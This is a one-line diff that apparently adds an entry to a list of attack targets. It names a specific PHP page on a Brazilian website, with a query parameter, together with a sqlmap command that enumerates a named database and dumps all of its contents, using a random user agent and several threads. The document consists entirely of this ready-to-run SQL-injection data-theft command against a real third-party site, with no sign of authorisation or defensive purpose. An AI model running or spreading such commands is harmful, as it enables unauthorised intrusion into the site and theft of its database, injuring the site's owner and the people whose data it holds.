@@ -1,0 +1,1 @@
+http://www.fortedaspiscinas.com.br/individual.php?codigo=2020001 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.fortedaspiscinas.com.br/individual.php?codigo=2020001 -D fortedaspiscin --dump-all
